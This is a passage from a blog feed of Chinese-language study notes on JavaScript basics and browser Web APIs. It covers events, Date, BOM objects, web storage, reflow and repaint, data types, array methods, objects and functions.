title="原理"></a>原理</h4><p>给父元素注册事件，当我们触发子元素的时候，会冒泡到父元素身上，触发父元素的事件</p><blockquote><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>tagName<span class="token punctuation">;</span> <span class="token comment">// 可以获取真正触发事件的元素</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h2 id="两种注册事件的区别"><a href="#两种注册事件的区别" class="headerlink" title="两种注册事件的区别"></a>两种注册事件的区别</h2><h4 id="传统-on-注册（L0）"><a href="#传统-on-注册（L0）" class="headerlink" title="传统 on 注册（L0）"></a>传统 on 注册（L0）</h4><ul><li>同一个对象,后面注册的事件会覆盖前面注册(同一个事件)</li><li>直接使用 null 覆盖偶就可以实现事件的解绑</li><li>都是冒泡阶段执行的</li></ul><h4 id="事件监听注册（L2）"><a href="#事件监听注册（L2）" class="headerlink" title="事件监听注册（L2）"></a>事件监听注册（L2）</h4><ul><li>语法: addEventListener(事件类型, 事件处理函数, 是否使用捕获)</li><li>后面注册的事件不会覆盖前面注册的事件(同一个事件)</li><li>可以通过第三个参数去确定是在冒泡或者捕获阶段执行</li><li>必须使用 removeEventListener(事件类型, 事件处理函数, 获取捕获或者冒泡阶段)</li><li>匿名函数无法被解绑</li></ul><h2 id="日期对象"><a href="#日期对象" class="headerlink" title="日期对象"></a>日期对象</h2><h3 id="实例化"><a href="#实例化" class="headerlink" title="实例化"></a>实例化</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> date <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><table><thead><tr><th>方法</th><th>作用</th><th>说明</th></tr></thead><tbody><tr><td>getFullYear()</td><td>获得年份</td><td>获取四位年份</td></tr><tr><td>getMonth()</td><td>获取月份</td><td>0~11</td></tr><tr><td>getDate()</td><td>月份中的第几天</td><td>1~31</td></tr><tr><td>getDay()</td><td>一周的第几天</td><td>0~6，0 是星期日</td></tr><tr><td>getHours</td><td>小时</td><td>0~23</td></tr><tr><td>getMinutes()</td><td>分钟</td><td>0~59</td></tr><tr><td>getSeconds()</td><td>秒</td><td>0~59</td></tr><tr><td>getTime()</td><td>时间戳</td><td>返回自 1970 年 1 月 1 日 00:00:00 (UTC) 到当前时间的毫秒数。</td></tr><tr><td>Date.now()</td><td>时间戳</td><td>返回自 1970 年 1 月 1 日 00:00:00 (UTC) 到当前时间的毫秒数。</td></tr><tr><td>toLocaleString()</td><td></td><td>2000&#x2F;1&#x2F;1 00:00:00</td></tr><tr><td>toLocaleDateString()</td><td></td><td>2000&#x2F;1&#x2F;1</td></tr></tbody></table><h2 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h2><p>BOM(Browser Object Model) 浏览器对象模型</p><p><img src="/2023/02/28/js-WebApis/image-20230410013410631.png" alt="image-20230410013410631"></p><h3 id="window"><a href="#window" class="headerlink" title="window"></a>window</h3><p>window对象是一个全局对象，也可以说是JavaScript中的顶级对象</p><p>像document、alert()、console.log()这些都是window的属性，基本BOM的属性和方法都是window的。</p><p>所有通过var定义在全局作用域中的变量、函数都会变成window对象的属性和方法</p><p>window对象下的属性和方法调用的时候可以省略window</p><h3 id="location"><a href="#location" class="headerlink" title="location"></a>location</h3><p>location 对象拆分并保存了 URL 地址的各个组成部分</p><h4 id="常用属性和方法"><a href="#常用属性和方法" class="headerlink" title="常用属性和方法"></a>常用属性和方法</h4><ul><li>href 属性获取完整的 URL 地址，对其赋值时用于地址的跳转</li><li>search 属性获取地址中携带的参数，符号 ？后面部分</li><li>hash 属性获取地址中的啥希值，符号 # 后面部分</li><li>reload 方法用来刷新当前页面，传入参数 true 时表示强制刷新</li></ul><h3 id="navigator"><a href="#navigator" class="headerlink" title="navigator"></a>navigator</h3><p>navigator对象下记录了浏览器自身的相关信息</p><h4 id="常用属性和方法-1"><a href="#常用属性和方法-1" class="headerlink" title="常用属性和方法"></a>常用属性和方法</h4><ul><li><p>userAgent 检测浏览器的版本及平台</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 检测 userAgent（浏览器信息）</span>        <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> userAgent <span class="token operator">=</span> navigator<span class="token punctuation">.</span>userAgent            <span class="token comment">// 验证是否为Android或iPhone</span>            <span class="token keyword">const</span> android <span class="token operator">=</span> userAgent<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(Android);?[\s\/]+([\d.]+)?</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span>            <span class="token keyword">const</span> iphone <span class="token operator">=</span> userAgent<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(iPhone\sOS)\s([\d_]+)</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span>            <span class="token comment">// 如果是Android或iPhone，则跳转至移动站点</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>android <span class="token operator">||</span> iphone<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'http://m.itcast.cn'</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="history"><a href="#history" class="headerlink" title="history"></a>history</h3><p>history对象主要管理历史记录， 该对象与浏览器地址栏的操作相对应，如前进、后退、历史记录等</p><h4 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h4><ul><li>back() 后退功能</li><li>forward() 前进功能</li><li>go(参数) 前进后退功能（参数如果是1前进，如果是-1后退一个页面）</li></ul><h3 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h3><p>可以将数据永久存储在本地(用户的电脑), 除非手动删除，否则关闭页面也会存在</p><h4 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h4><ul><li>可以多窗口（页面）共享（同一浏览器可以共享）</li><li>以键值对的形式存储使用</li></ul><h4 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h4><ul><li><p>存储数据：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>获取数据</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>删除数据</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">localStorage<span class="token punctuation">.</span><span class="token function">removeItem</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="sessionStorage"><a href="#sessionStorage" class="headerlink" title="sessionStorage"></a>sessionStorage</h3><h4 id="特性-1"><a href="#特性-1" class="headerlink" title="特性"></a>特性</h4><ul><li>生命周期为关闭浏览器窗口</li><li>在同一个窗口(页面)下数据可以共享</li><li>以键值对的形式存储使用</li><li>用法跟localStorage 基本相同</li></ul><h2 id="重绘和回流"><a href="#重绘和回流" class="headerlink" title="重绘和回流"></a>重绘和回流</h2><h3 id="浏览器是如何进行界面渲染的"><a href="#浏览器是如何进行界面渲染的" class="headerlink" title="浏览器是如何进行界面渲染的"></a>浏览器是如何进行界面渲染的</h3><ol><li>解析（Parser）HTML，生成 DOM 树(DOM Tree)</li><li>同时解析（Parser） CSS，生成样式规则 (Style Rules)</li><li>根据 DOM 树和样式规则，生成渲染树(Render Tree)</li><li>进行布局 Layout(回流&#x2F;重排):根据生成的渲染树，得到节点的几何信息（位置，大小）</li><li>进行绘制 Painting(重绘): 根据计算和获取的信息进行整个页面的绘制</li><li>Display: 展示在页面上</li></ol><h3 id="回流-重排"><a href="#回流-重排" class="headerlink" title="回流(重排)"></a>回流(重排)</h3><p>当 Render Tree 中部分或者全部元素的尺寸、结构、布局等发生改变时，浏览器就会重新渲染部分或全部文档的过程称为 回流。</p><h3 id="重绘"><a href="#重绘" class="headerlink" title="重绘"></a>重绘</h3><p>由于节点(元素)的样式的改变并不影响它在文档流中的位置和文档布局时(比如：color、background-color、outline 等), 称为重绘</p><blockquote><p>重绘不一定引起回流，而回流一定会引起重绘。</p></blockquote><h3 id="会导致回流（重排）的操作"><a href="#会导致回流（重排）的操作" class="headerlink" title="会导致回流（重排）的操作"></a>会导致回流（重排）的操作</h3><ul><li>页面的首次刷新</li><li>浏览器的窗口大小发生改变</li><li>元素的大小或位置发生改变</li><li>改变字体的大小</li><li>内容的变化（如：input 框的输入，图片的大小）</li><li>激活 css 伪类 （如：:hover）</li><li>脚本操作 DOM（添加或者删除可见的 DOM 元素</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript</title>
      <link href="/2023/02/25/JavaScript/"/>
      <url>/2023/02/25/JavaScript/</url>
      
        <content type="html"><![CDATA[<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>使用 const 声明的变量</p><p>注意：常量不允许重新赋值, 声明的时候必须赋值（初始化）</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h3><p>值类型&#x2F;简单数据类型&#x2F;基本数据类型, 在存储时变量中存储的是值本身, 因此叫做值类型</p><ul><li><p>number 数字型</p><p>js 中的所有数字统称为数字类型</p><p>NaN 表示一个计算错误, 是一个不正确的或者一个未定义的数学操作所得到的结果</p><blockquote><p>NaN 是粘性的, 任何对 NaN 的操作都会返回 NaN</p><p>减法 - （像大多数数学运算一样）只能用于数字, 它会使空字符串 “” 转换为 0</p><p>undefined 经过数字转换之后会变为 NaN</p><p>null 经过数字转换之后会变为 0</p></blockquote><ul><li>toFixed() 设置保留小数位的长度</li></ul></li><li><p>string 字符串型</p><pre class="line-numbers language-none"><code class="language-none">使用单引号&#39;&#39;,双引号&quot;&quot;, 反引号&#96;&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>模板字符串, 可以使拼接字符串更简便：用反引号包含数据, 用${}使用变量</p><pre class="line-numbers language-none"><code class="language-none">&#96;我今年$&#123;age&#125;岁了&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>trim()</code>去头尾空格</p></blockquote></li><li><p>boolean 布尔型</p><blockquote><p>空字符串’’、数字 0、undefined、null、false、NaN 转换为布尔值后都是 false, 其余则为 true</p></blockquote></li><li><p>undefined 未定义型</p><p>只声明变量, 不赋值的情况下, 变量的默认值为 undefined,</p></li><li><p>null 空类型</p><p>把 null 作为尚未创建的对象</p><h4 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h4><ul><li><p>转换为数字型：</p><ul><li><p>Number(数据)：转成数字类型</p><p>如果字符串内容里有非数字, 转换失败, 结果为 NaN</p></li><li><p>parseInt(数据)：只保留整数</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">'2a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>parseFloat(数据)：保留小数</p></li></ul></li><li><p>转换为字符型</p><ul><li>String(数据)</li><li>变量.toString(进制)</li></ul></li></ul></li></ul><h3 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h3><p>复杂数据类型, 在存储时变量中存储的仅仅是地址（引用）, 因此叫做引用数据类型</p><p>通过 new 关键字创建的对象（系统对象、自定义对象）, 如 Object、Array、Date 等</p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>数组并不是一种单独的类型，也属于 Object 对象的范畴</p><h4 id="声明："><a href="#声明：" class="headerlink" title="声明："></a>声明：</h4><p><code>let arr = [elem1, elem2]</code></p><h4 id="APIs"><a href="#APIs" class="headerlink" title="APIs"></a>APIs</h4><ul><li>Array.from() 伪数组转换为真数组</li></ul><ul><li><p>push(元素 1, …, 元素 n); &#x2F;&#x2F; 将一个或多个元素添加到数组末尾, 并返回该数组的新长度</p></li><li><p>unshift(元素 1, …, 元素 n); &#x2F;&#x2F; 将一个或多个元素添加到数组的开头, 并返回该数组的新长度</p></li><li><p>pop(); &#x2F;&#x2F; 从数组中删除最后一个元素, 并返回该元素的值</p></li><li><p>shift(); &#x2F;&#x2F; 从数组中删除第一个元素, 并返回该元素的值</p></li><li><p>splice(start, deleteCount); &#x2F;&#x2F; 从指定位置开始删除指定个数元素</p><ul><li><p>start:指定修改的开始位置（从 0 计数）</p></li><li><p>deleteCount：表示要移除的数组元素的个数<br>可选的。 如果省略则默认从指定的起始位置删<br>除到最后</p></li></ul></li><li><p>sort()</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 升序</span>arr<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> a <span class="token operator">-</span>b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 降序</span>arr<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token function">funtion</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> b <span class="token operator">-</span> a<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>forEach() 可用来遍历数组</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">arr<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">currentValue<span class="token punctuation">[</span><span class="token punctuation">,</span> index<span class="token punctuation">]</span></span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>currentValue:当前数组元素</li><li>index：当前元素索引号</li></ul></li><li><p>map() 可以处理数据，并且返回新的数组</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">arr<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">return</span> item <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>filter() 筛选数组</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">arr<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">currentValue<span class="token punctuation">[</span><span class="token punctuation">,</span> index<span class="token punctuation">]</span></span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">return</span> currentValue <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>返回值：数组，包含了符合条件的所有元素。如果没有符合条件的元素则返回空数组</li></ul></li><li><p>reduce(function(previousValue, currentValue[, currentIndex] [, array]) { &#x2F;_ … _&#x2F; }[, initialValue]) 返回函数累计处理的结果，经常用于求和等</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> total <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">previousValue<span class="token punctuation">,</span> currentValue</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> previousValue <span class="token operator">+</span> currentValue<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>如果有起始值，则以起始值为准开始累计， 累计值 &#x3D; 起始值</li><li>如果没有起始值， 则累计值以数组的第一个数组元素作为起始值开始累计</li><li>后面每次遍历就会用后面的数组元素 累计到累计值里面 （类似求和里面的 sum ）</li></ul></li><li><p>join(str) 用于把数组中的所有元素转换一个字符串</p><ul><li>str: 数组元素是通过参数里面指定的分隔符进行分隔的</li></ul></li><li><p>find() 查找元素,</p><ul><li><p>返回值：返回符合测试条件的第一个数组元素值，</p><p>如果没有符合条件的则返回 undefined</p></li></ul></li><li><p>every() 检测数组所有元素是否都符合指定条件，</p><ul><li>如果所有元素都通过检测返回 true，否则返回 false</li></ul></li><li><p>some() 检测数组中的元素是否满足指定条件  </p><ul><li>如果数组中有元素满足条件返回 true，否则返回 false</li></ul></li><li><p>concat() 合并两个数组，返回生成新数组</p></li><li><p>reverse() 反转数组</p></li></ul><h3 id="对象："><a href="#对象：" class="headerlink" title="对象："></a>对象：</h3><p>对象由属性和方法组成。</p><h4 id="声明创建："><a href="#声明创建：" class="headerlink" title="声明创建："></a>声明创建：</h4><ul><li>使用字面量</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">key</span><span class="token operator">:</span> value<span class="token punctuation">,</span>  <span class="token function-variable function">f</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 方法体</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>属性和值用: 隔开</p><p>多个属性用, 隔开</p><p>属性名可以用’’ 或”” , 一般情况省略, 除非遇到特殊符号</p></blockquote><ul><li><p>利用 new Object 创建</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'wujiu'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用构造函数</p></li></ul><h4 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h4><ul><li><p>访问：<code>对象名.属性名</code></p><p>也可以通过<code>对象[&#39;属性名&#39;]</code></p><blockquote><p>使用[]访问时, 如果不加引号, 会当作变量来解析</p></blockquote></li><li><p>修改：<code>对象名.属性名 = 值;</code></p></li><li><p>添加：<code>对象名.新属性名 = 值;</code></p></li><li><p>删除：<code>delete 对象名.属性名</code></p></li></ul><h4 id="遍历对象-for-in"><a href="#遍历对象-for-in" class="headerlink" title="遍历对象(for in)"></a>遍历对象(for in)</h4><p><strong><code>for...in</code></strong> <strong>语句</strong>以任意顺序迭代一个对象的除<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Symbol">Symbol</a>以外的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Enumerability_and_ownership_of_properties">可枚举</a>属性, 包括继承的可枚举属性。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> object<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="内置对象"><a href="#内置对象" class="headerlink" title="内置对象"></a>内置对象</h3><p>JavaScript 内部提供的对象, 包含各种属性和方法给开发者调用</p><h5 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h5><p>Math 对象是 JavaScript 提供的一个“数学”对象, 提供了一系列做数学运算的方法</p><ul><li>random()：生成 0-1 之间的随机数（包含 0 不包括 1）</li><li>ceil()：向上取整</li><li>floor()：向下取整</li><li>max()：找最大数</li><li>min()：找最小数</li><li>pow()：幂运算</li><li>abs()：绝对值</li></ul><h6 id="如何生成-N-M-之间的随机数"><a href="#如何生成-N-M-之间的随机数" class="headerlink" title="如何生成 N-M 之间的随机数"></a>如何生成 N-M 之间的随机数</h6><p><code>Math.floor(Math.random() * (M - N + 1)) +N</code></p><h3 id="检测数据类型"><a href="#检测数据类型" class="headerlink" title="检测数据类型"></a>检测数据类型</h3><p>typeof 运算符可以返回被检测的数据类型。</p><ol><li><p>作为运算符 typeof x （常用）</p></li><li><p>作为函数 typeof(x)</p><blockquote><p>结果是相同的</p></blockquote></li></ol><h2 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h2><p><img src="/./JavaScript/image-20230228175105792.png" alt="image-20230228175105792"></p><h2 id="函数（function）"><a href="#函数（function）" class="headerlink" title="函数（function）"></a>函数（function）</h2><h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">函数名</span><span class="token punctuation">(</span><span class="token parameter">参数<span class="token number">1</span><span class="token punctuation">,</span> 参数n</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 函数体</span>  <span class="token keyword">return</span> xxx<span class="token punctuation">;</span> <span class="token comment">// 可选</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li>命名规范：和变量命名基本一致, 小驼峰</li><li>实参的个数和形参的个数可以不一致<ul><li>如果形参过多 会自动填上 undefined</li><li>如果实参过多 那么多余的实参会被忽略</li></ul></li><li>若不指定返回值, 函数默认返回值为 undefined</li></ul></blockquote><p>可以手动指定参数的默认值</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">函数名</span><span class="token punctuation">(</span><span class="token parameter">参数<span class="token number">1</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> 参数n <span class="token operator">=</span> <span class="token number">0</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 函数体</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">函数名</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>函数可以分为具名函数和匿名函数</p><ul><li><p>函数表达式</p><p>将匿名函数赋值给一个变量, 并且通过变量名称进行调用 我们将这个称为函数表达式</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> <span class="token function-variable function">fn</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 函数体</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 调用</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>立即执行函数</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 函数体</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 函数体</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>该方式可以防止变量污染</p><p>多个立即执行函数之间必须使用分号隔开</p></blockquote></li></ul><h3 id="动态参数"><a href="#动态参数" class="headerlink" title="动态参数"></a>动态参数</h3><p>arguments 是函数内部内置的伪数组变量, 它包含了调用函数时传入的所有实参</p><p>注：</p><ol><li>arguments 是一个伪数组, 只存在于函数中</li><li>arguments 的作用是动态获取函数的实参</li><li>可以通过 for 循环依次得到传递过来的实参</li></ol><h3 id="剩余参数"><a href="#剩余参数" class="headerlink" title="剩余参数"></a>剩余参数</h3><p>剩余参数允许我们将一个不定数量的参数表示为一个数组</p><ol><li><p><code>...</code> 是语法符号, 置于最末函数形参之前, 用于获取多余的实参</p></li><li><p>借助 <code>...</code> 获取的剩余实参, 是个真数组</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">getSum</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>other</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 得到[1, 2, 3]</span><span class="token punctuation">&#125;</span><span class="token function">getSum</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="展开运算符"><a href="#展开运算符" class="headerlink" title="展开运算符"></a>展开运算符</h3><p><code>...</code>, 能将一个数组进行展开(不会修改原数组)</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">var</span> arr2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 将 arr2 中的元素插入到 arr1 的开头</span><span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>arr1<span class="token punctuation">,</span> arr2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// arr1 现在是 [3, 4, 5, 0, 1, 2]</span><span class="token keyword">var</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token 